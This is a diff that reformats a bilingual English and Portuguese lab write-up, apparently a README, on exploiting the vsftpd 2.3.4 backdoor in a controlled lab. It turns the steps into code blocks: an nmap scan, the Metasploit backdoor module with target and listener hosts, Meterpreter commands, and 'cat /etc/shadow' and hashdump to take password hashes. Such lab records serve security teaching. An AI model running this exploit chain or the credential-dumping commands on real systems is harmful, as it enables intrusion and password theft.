@@ -14,42 +14,48 @@ Exploit a known vulnerability in vsftpd 2.3.4 in a controlled lab environment.
 #### 🔍 Enumeration
 A scan was performed using Nmap:
 
-nmap -sV <TARGET_IP>
 ```bash
 nmap -sV <TARGET_IP>
 ```
-Port 21 was found open running FTP service (vsftpd 2.3.4).
+
+Port 21 was found open running an FTP service (vsftpd 2.3.4).
 
 #### 🔎 Vulnerability Research
-The service version was searched using searchsploit and CVE databases, revealing a known backdoor vulnerability.
+The service version was researched using searchsploit and CVE databases, revealing a known backdoor vulnerability.
 
 #### 💥 Exploitation
 The exploit was executed using Metasploit:
 
+```bash
 use exploit/unix/ftp/vsftpd_234_backdoor
-
-RHOST and LHOST were configured, and the exploit was launched.
+set RHOST <TARGET_IP>
+set LHOST <YOUR_IP>
+exploit
+```
 
 #### 🧪 Post-Exploitation
-Access to the system was obtained via Meterpreter.
+Access to the system was obtained via a Meterpreter session.
 
 Commands executed:
-- getuid
-- sysinfo
-- ls
-- shell
-- whoami
+
+```bash
+getuid
+sysinfo
+ls
+shell
+whoami
+```
 
 #### 🔐 Sensitive Data Access
 The following actions were performed:
-- Reading /etc/shadow
-- Dumping password hashes using hashdump
+
+```bash
+cat /etc/shadow
+hashdump
+```
 
 #### 📚 Conclusion
 This lab demonstrates how outdated services can lead to full system compromise.
-
-
-
 
 ---
 
@@ -69,7 +75,9 @@ Explorar uma vulnerabilidade conhecida no vsftpd 2.3.4 em um ambiente controlado
 #### 🔍 Enumeração
 Foi realizado um scan utilizando o Nmap:
 
+```bash
 nmap -sV <IP_DO_ALVO>
+```
 
 Foi identificada a porta 21 aberta executando o serviço FTP (vsftpd 2.3.4).
 
@@ -79,24 +87,33 @@ A versão do serviço foi pesquisada utilizando searchsploit e bases de dados de
 #### 💥 Exploração
 O exploit foi executado utilizando o Metasploit:
 
+```bash
 use exploit/unix/ftp/vsftpd_234_backdoor
-
-Foram configurados os parâmetros RHOST e LHOST, e o exploit foi executado.
+set RHOST <IP_DO_ALVO>
+set LHOST <SEU_IP>
+exploit
+```
 
 #### 🧪 Pós-exploração
 Foi obtido acesso ao sistema através de uma sessão Meterpreter.
 
 Comandos executados:
-- getuid
-- sysinfo
-- ls
-- shell
-- whoami
+
+```bash
+getuid
+sysinfo
+ls
+shell
+whoami
+```
 
 #### 🔐 Acesso a Dados Sensíveis
 Foram realizadas as seguintes ações:
-- Leitura do arquivo /etc/shadow
-- Extração de hashes de senha utilizando hashdump
+
+```bash
+cat /etc/shadow
+hashdump
+```
 
 #### 📚 Conclusão
 Este laboratório demonstra como serviços desatualizados podem levar ao comprometimento total de um sistema.
